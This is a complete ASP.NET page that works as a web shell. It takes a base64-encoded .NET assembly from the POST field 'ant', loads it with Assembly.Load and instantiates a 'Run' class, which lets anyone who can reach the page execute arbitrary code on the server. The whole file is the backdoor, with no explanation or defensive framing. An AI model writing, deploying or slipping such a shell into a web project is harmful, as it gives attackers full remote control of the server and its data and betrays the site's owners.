<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance("Run").Equals(this);
    }

%>